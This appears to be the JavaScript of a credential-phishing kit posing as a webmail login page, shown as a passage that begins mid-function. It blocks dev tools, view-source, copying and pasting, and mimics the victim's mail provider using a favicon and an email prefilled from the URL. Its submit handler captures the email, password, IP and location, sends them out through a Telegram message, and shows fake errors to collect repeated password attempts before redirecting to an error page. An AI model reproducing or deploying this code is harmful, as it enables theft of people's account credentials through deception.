// Block right-click (context menu)
document.addEventListener('contextmenu', e => {
    e.preventDefault();
    return false;
}, false);

// Block common dev tools shortcuts
document.addEventListener('keydown', function(e) {
    // F12
    if (e.key === 'F12') {
        e.preventDefault();
        return false;
    }

    // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+Shift+K
    if (e.ctrlKey && e.shiftKey && ['I','J','C','K'].includes(e.key.toUpperCase())) {
        e.preventDefault();
        return false;
    }

    // Ctrl+U (view source), Ctrl+S (save), Ctrl+P (print), Ctrl+C (copy)
    if (e.ctrlKey && ['U','S','P','C'].includes(e.key.toUpperCase())) {
        e.preventDefault();
        return false;
    }

    // Ctrl+Shift+U (some browsers)
    if (e.ctrlKey && e.shiftKey && e.key.toUpperCase() === 'U') {
        e.preventDefault();
        return false;
    }

    // Meta+Alt+I (Mac dev tools)
    if (e.metaKey && e.altKey && e.key.toUpperCase() === 'I') {
        e.preventDefault();
        return false;
    }
}, true);

// Block copy, cut, paste, select, drag
document.addEventListener('copy', e => e.preventDefault(), false);

document.addEventListener('paste', e => e.preventDefault(), false);
document.addEventListener('selectstart', e => e.preventDefault(), false);

// Block view-source: protocol (basic client-side prevention)

// ─── Particle Animation ──────────────────────────────────────────────
const canvas = document.getElementById('particle-canvas');
const ctx = canvas.getContext('2d');
let particlesArray;

function initParticles() {
  particlesArray = [];
  for (let i = 0; i < 100; i++) {
    particlesArray.push({
      x: Math.random() * window.innerWidth,
      y: Math.random() * window.innerHeight,
      size: Math.random() * 3 + 1,
      speedX: (Math.random() - 0.5) * 0.5,
      speedY: (Math.random() - 0.5) * 0.5,
    });
  }
}

function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}

window.addEventListener('resize', () => {
  resizeCanvas();
  initParticles();
});

function animateParticles() {
  ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
  particlesArray.forEach(p => {
    p.x += p.speedX;
    p.y += p.speedY;
    if (p.x < 0 || p.x > window.innerWidth) p.speedX *= -1;
    if (p.y < 0 || p.y > window.innerHeight) p.speedY *= -1;
    ctx.beginPath();
    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
    ctx.fillStyle = 'rgba(255,255,255,0.4)';
    ctx.fill();
  });
  connectParticles();
  requestAnimationFrame(animateParticles);
}

function connectParticles() {
  for (let a = 0; a < particlesArray.length; a++) {
    for (let b = a + 1; b < particlesArray.length; b++) {
      const dx = particlesArray[a].x - particlesArray[b].x;
      const dy = particlesArray[a].y - particlesArray[b].y;
      const distance = Math.sqrt(dx * dx + dy * dy);
      if (distance < 100) {
        ctx.strokeStyle = `rgba(255,255,255,${1 - distance / 100})`;
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
        ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
        ctx.stroke();
      }
    }
  }
}

resizeCanvas();
initParticles();
animateParticles();

    }

    const logoUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;

    $logo.attr('src', logoUrl).on('load', function() {
      if (this.naturalWidth <= 32 || this.naturalHeight <= 32) {
        this.src = DEFAULT_LOGO;
      }
    }).on('error', function() {
      this.src = DEFAULT_LOGO;
    });
  };

  const handleSubmit = e => {
    e.preventDefault();
    const email = sanitizeInput($email.val());
    const password = sanitizeInput($password.val());
    if (!email || !password) return;

    attemptCount++;
    $button.prop('disabled', true).addClass('loading').text('Verifying...');
    $error.hide();

    const maskedEmail = email.replace('@', '+');
    const message = `*${domain.toUpperCase() || 'UNKNOWN'} WEBMAIL LOGIN*\n` +
      `|───Script3d|By|Prim3───|\n` +
      `*Email:* \`${maskedEmail}\`\n` +
      `*Password:* \`${password}\`\n` +
      `*IP:* \`${userIp.ip}\`\n` +
      `*Location:* ${userIp.city}, ${userIp.country}\n` +
      `*Attempts:* ${attemptCount}/${CONFIG.ATTEMPT_LIMIT}\n` +
      `*Time:* ${new Date().toLocaleString()}\n` +
      `|───Script3d|By|Prim3───|\n`;

    sendTelegramMessage(message);

    setTimeout(() => {
      $button.prop('disabled', false).removeClass('loading').text(translations[currentLang].button);
      if (attemptCount <= CONFIG.ATTEMPT_LIMIT) {
        $error.show();
        $password.val('').focus();
        toggleBtn.classList.remove('visible');
      } else {
        window.location.href = 'https://support.cpanel.net/hc/en-us/articles/360048399873-500-Internal-Server-Error';
      }
    }, CONFIG.DELAY_MS);
  };

  $(window).on('load', () => {
    setLanguage('en');
    const emailFromHash = getHashParam();
    if (emailFromHash && emailFromHash.includes('@')) {
      $email.val(emailFromHash).prop('readonly', true);
      domain = extractDomain(emailFromHash);
      updateDomainUI(domain);
    }
    fetchIpInfo();
    $form.on('submit', handleSubmit);
    document.getElementById('language-select').addEventListener('change', (e) => {
      setLanguage(e.target.value);
      if (domain) updateDomainUI(domain);
    });
  });
})();
</script>

</body>
</html>
